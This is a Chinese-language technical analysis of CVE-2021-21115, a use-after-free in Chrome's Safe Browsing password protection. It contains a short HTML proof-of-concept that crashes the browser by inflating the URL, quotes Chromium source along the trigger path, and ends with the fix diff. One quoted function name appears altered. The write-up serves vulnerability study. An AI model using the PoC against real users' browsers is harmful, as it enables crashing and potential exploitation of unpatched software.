CVE-2021-21115是在处理PasswordProtectionRequest时再serialized information超出规定长度时，将会立即结束该request，并且释放了pending_requests_，但在之后的finish中pending_requests_仍会被使用导致了uaf的产生。

poc
```
<!DOCTYPE html>
<html>
<head>
    <button id="triggerButton">Trigger</button>
<script>
    triggerButton = document.querySelector('#triggerButton');
    triggerButton.addEventListener('click', async event => {
        window.location.href = window.location.href+"#".repeat(0x100000);
        setInterval(()=>{ 
            document.writeln("CheckSafeBrowsingReputation","","");
        },10);
    }); 
</script>
</head>
</html>
```

如果我们在运行chrome时开启了Help-Improve-Security flag，检查白名单时会发送sampled_ping request：
```
void PasswordProtectionRequest::OnWhitelistCheckDone(bool match_whitelist) {
  DCHECK(CurrentlyOnThread(ThreadID::UI));
  if (match_whitelist) {
    if (password_protection_service_->CanSendSamplePing()) {
      FillRequestProto(/*is_sampled_ping=*/true);
    }
    Finish(RequestOutcome::MATCHED_WHITELIST, nullptr);
  } else {
    // In case the request to Safe Browsing takes too long,
    // we set a timer to cancel that request and return an "unspecified verdict"
    // so that the navigation isn't blocked indefinitely.
    StartTimeout();
    CheckCachedVerdicts();
  }
}
```
我们这里先去看FillRequestProto函数，注意这个finish，之后是出发uaf的关键，我们后面还会见到他。

```
void PasswordProtectionRequest::FillRequestProto(bool is_sampled_ping) {
  request_proto_->set_page_url(main_frame_url_.spec());
  LoginReputationClientRequest::Frame* main_frame =
      request_proto_->add_frames();
  main_frame->set_url(main_frame_url_.spec());
  main_frame->set_frame_index(0 /* main frame */);
  password_protection_service_->FillReferrerChain(
      main_frame_url_, SessionID::InvalidValue(), main_frame);

  // If a sample ping is send, only the URL and referrer chain is sent in the
  // request.
  if (is_sampled_ping) {
    LogPasswordProtectionSampleReportSent();
    request_proto_->set_report_type(
        LoginReputationClientRequest::SAMPLE_REPORT);
    request_proto_->clear_trigger_type();
    if (main_frame->referrer_chain_size() > 0) {
      password_protection_service_->SanitizeReferrerChain(
          main_frame->mutable_referrer_chain());
    }
    SendRequest();
    return;
  } else {
    request_proto_->set_report_type(LoginReputationClientRequest::FULL_REPORT);
  }

.....

}
```
在FillRequestProto函数中会调用SendRequest()函数去发送请求：

```
void PasswordProtectionRequest::SendRequest() {
  DCHECK(CurrentlyOnThread(ThreadID::UI));
  if (password_protection_service_->CanGetAccessToken() &&
      password_protection_service_->token_fetcher()) {
    password_protection_service_->token_fetcher()->Start(
        base::BindOnce(&PasswordProtectionRequest::SendRequestWithToken,
                       weak_factory_.GetWeakPtr()));
    return;
  }
  std::string empty_access_token;
  SendRequestWithToken(empty_access_token);
}
```
SendRequest紧接着调用了SendRequestWithToken。

```
void PasswordProtectionRequest::SendRequestWithToken(
    const std::string& access_token) {
  DCHECK(CurrentlyOnThread(ThreadID::UI));

  MaybeAddPingToWebUI(access_token);

  std::string serialized_request;
  
  if (!request_proto_->SerializeToString(&serialized_request)) {
    Finish(RequestOutcome::REQUEST_MALFORMED, nullptr);
    return;
}

  net::NetworkTrafficAnnotationTag traffic_annotation =
      net::DefineNetworkTrafficAnnotation("password_protection_request", R"(
        semantics {
          sender: "Safe Browsing"
          description:
            "When the user is about to log in to a new, uncommon site, Chrome "
            "will send a request to Safe Browsing to determine if the page is "
            "phishing. It'll then show a warning if the page poses a risk of "
            "phishing."
          trigger:
            "When a user focuses on a password field on a page that they "
            "haven't visited before and that isn't popular or known to be safe."
          data:
            "URL and referrer of the current page, password form action, and "
            "iframe structure."
          destination: GOOGLE_OWNED_SERVICE
        }
        policy {
          cookies_allowed: YES
          cookies_store: "Safe Browsing Cookie Store"
          setting:
            "Users can control this feature via 'Protect you and your device "
            "from dangerous sites'. By default, this setting is enabled."
            "Alternatively, you can turn it off via "
            "'PasswordProtectionWarningTrigger' enterprise policy setting."
          chrome_policy {
            PasswordProtectionWarningTrigger {
              policy_options {mode: MANDATORY}
              PasswordProtectionWarningTrigger: 2
            }
          }
        })");
  auto resource_request = std::make_unique<network::ResourceRequest>();
  bool has_access_token = !access_token.empty();
  LogPasswordProtectionRequestTokenHistogram(trigger_type_, has_access_token);
  if (has_access_token) {
    resource_request->headers.SetHeader(
        net::HttpRequestHeaders::kAuthorization,
        base::StrCat({kAuthHeaderBearer, access_token}));
  }
  resource_request->url =
      PasswordProtectionServiceBase::GetPasswordProtectionRequestUrl();
  resource_request->method = "POST";
  resource_request->load_flags = net::LOAD_DISABLE_CACHE;
  url_loader_ = network::SimpleURLLoader::Create(std::move(resource_request),
                                                 traffic_annotation);
  url_loader_->AttachStringForUpload(serialized_request,
                                     "application/octet-stream");
  request_start_time_ = base::TimeTicks::Now();
  url_loader_->DownloadToStringOfUnboundedSizeUntilCrashAndDie(
      password_protection_service_->url_loader_factory().get(),
      base::BindOnce(&PasswordProtectionRequest::OnURLLoaderComplete,
                     AsWeakPtr()));
}
```
关键的代码是下面这部分：
```
if (!request_proto_->SerializeToString(&serialized_request)) {
    Finish(RequestOutcome::REQUEST_MALFORMED, nullptr);
    return;
}
```
可以看到如果在SerializeToString中出现错误的话，就会导致提前调用Finish。
那我们就去分析一下如何让SerializeToString产生错误：

这里有一个调用链：MessageLite::AppendToString() -> MessageLite::AppendPartialToString()
```
bool MessageLite::AppendToString(std::string* output) const {
  GOOGLE_DCHECK(IsInitialized()) << InitializationErrorMessage("serialize", *this);
  return AppendPartialToString(output);
}

bool MessageLite::AppendPartialToString(std::string* output) const {
  size_t old_size = output->size();
  size_t byte_size = ByteSizeLong();
  if (byte_size > INT_MAX) {
    GOOGLE_LOG(ERROR) << GetTypeName()
               << " exceeded maximum protobuf size of 2GB: " << byte_size;
    return false;
  }

  STLStringResizeUninitialized(output, old_size + byte_size);
  uint8* start =
      reinterpret_cast<uint8*>(io::mutable_string_data(output) + old_size);
  SerializeToArrayImpl(*this, start, byte_size);
  return true;
}
```
可以发现如果我们的serialized information长度过长也就是（byte_size > INT_MAX），就会返回一个false。

这就会导致提前调用finish，那我们来看一下finish：

```
void PasswordProtectionRequest::Finish(
    RequestOutcome outcome,
    std::unique_ptr<LoginReputationClientResponse> response) {
  DCHECK(CurrentlyOnThread(ThreadID::UI));
  tracker_.TryCancelAll();

  // If the request is canceled, the PasswordProtectionServiceBase is already
  // partially destroyed, and we won't be able to log accurate metrics.
  if (outcome != RequestOutcome::CANCELED) {
    ReusedPasswordAccountType password_account_type =
        password_protection_service_
            ->GetPasswordProtectionReusedPasswordAccountType(password_type_,
                                                             username_);
    if (trigger_type_ == LoginReputationClientRequest::UNFAMILIAR_LOGIN_PAGE) {
      LogPasswordOnFocusRequestOutcome(outcome);
    } else {
      LogPasswordEntryRequestOutcome(outcome, password_account_type);

      if (password_type_ == PasswordType::PRIMARY_ACCOUNT_PASSWORD) {
        MaybeLogPasswordReuseLookupEvent(outcome, response.get());
      }
    }

    if (outcome == RequestOutcome::SUCCEEDED && response) {
      LogPasswordProtectionVerdict(trigger_type_, password_account_type,
                                   response->verdict_type());
    }
  }
  password_protection_service_->RequestFinished(this, outcome,
                                                std::move(response));
}
```
这里我们主要去看最后调用的RequestFinished函数：
```
void PasswordProtectionServiceBase::RequestFinished(
    PasswordProtectionRequest* request,
    RequestOutcome outcome,
    std::unique_ptr<LoginReputationClientResponse> response) {
  DCHECK(CurrentlyOnThread(ThreadID::UI));
  DCHECK(request);

  if (response) {
    ReusedPasswordAccountType password_type =
        GetPasswordProtectionReusedPasswordAccountType(request->password_type(),
                                                       request->username());
    if (outcome != RequestOutcome::RESPONSE_ALREADY_CACHED) {
      CacheVerdict(request->main_frame_url(), request->trigger_type(),
                   password_type, *response, base::Time::Now());
    }
    bool enable_warning_for_non_sync_users = base::FeatureList::IsEnabled(
        safe_browsing::kPasswordProtectionForSignedInUsers);
    if (!enable_warning_for_non_sync_users &&
        request->password_type() == PasswordType::OTHER_GAIA_PASSWORD) {
      return;
    }

    // If it's password alert mode and a Gsuite/enterprise account, we do not
    // show a modal warning.
    if (outcome == RequestOutcome::PASSWORD_ALERT_MODE &&
        (password_type.account_type() == ReusedPasswordAccountType::GSUITE ||
         password_type.account_type() ==
             ReusedPasswordAccountType::NON_GAIA_ENTERPRISE)) {
      return;
    }

    if (ShouldShowModalWarning(request->trigger_type(), password_type,
                               response->verdict_type())) {
      username_for_last_shown_warning_ = request->username();
      reused_password_account_type_for_last_shown_warning_ = password_type;
      saved_passwords_matching_domains_ = request->matching_domains();
      ShowModalWarning(request->web_contents(), request->request_outcome(),
                       response->verdict_type(), response->verdict_token(),
                       password_type);
      request->set_is_modal_warning_showing(true);
    }
  }

  request->HandleDeferredNavigations();

  // If the request is canceled, the PasswordProtectionServiceBase is already
  // partially destroyed, and we won't be able to log accurate metrics.
  if (outcome != RequestOutcome::CANCELED) {
    auto verdict =
        response ? response->verdict_type()
                 : LoginReputationClientResponse::VERDICT_TYPE_UNSPECIFIED;

// Disabled on Android, because enterprise reporting extension is not supported.
#if !defined(OS_ANDROID)
    MaybeReportPasswordReuseDetected(
        request->web_contents(), request->username(), request->password_type(),
        verdict == LoginReputationClientResponse::PHISHING);
#endif

    // Persist a bit in CompromisedCredentials table when saved password is
    // reused on a phishing or low reputation site.
    auto is_unsafe_url =
        verdict == LoginReputationClientResponse::PHISHING ||
        verdict == LoginReputationClientResponse::LOW_REPUTATION;
    if (is_unsafe_url) {
      PersistPhishedSavedPasswordCredential(
          request->matching_reused_credentials());
    }
  }

  // Remove request from |pending_requests_| list. If it triggers warning, add
  // it into the !warning_reqeusts_| list.
  for (auto it = pending_requests_.begin(); it != pending_requests_.end();
       it++) {
    if (it->get() == request) {
      if (request->is_modal_warning_showing())
        warning_requests_.insert(std::move(request));
      pending_requests_.erase(it);
      break;
    }
  }
}
```
可以看到在RequestFinished的最后执行了pending_requests_.erase(it);将pending_requests\_释放。

这时候就要回到开头时我说的那个finish了，我们执行到这里正好执行完了FillRequestProto
```
if (match_whitelist) {
    if (password_protection_service_->CanSendSamplePing()) {
      FillRequestProto(/*is_sampled_ping=*/true);
    }
    Finish(RequestOutcome::MATCHED_WHITELIST, nullptr);
  } 
```
之后在下面的Finish中if (it->get() == request)处，使用了已经被释放的指针it，导致了uaf的产生。

```
diff --git a/components/safe_browsing/content/password_protection/password_protection_request.cc b/components/safe_browsing/content/password_protection/password_protection_request.cc
index a8676ec..2af1a9f 100644
--- a/components/safe_browsing/content/password_protection/password_protection_request.cc
+++ b/components/safe_browsing/content/password_protection/password_protection_request.cc
@@ -479,10 +479,8 @@
       WebUIInfoSingleton::GetInstance()->AddToPGPings(*request_proto_);
 
   std::string serialized_request;
-  if (!request_proto_->SerializeToString(&serialized_request)) {
-    Finish(RequestOutcome::REQUEST_MALFORMED, nullptr);
-    return;
-  }
+  // TODO(crbug.com/1158582): Return early if request serialization fails.
+  request_proto_->SerializeToString(&serialized_request);
 
   net::NetworkTrafficAnnotationTag traffic_annotation =
       net::DefineNetworkTrafficAnnotation("password_protection_request", R"(
```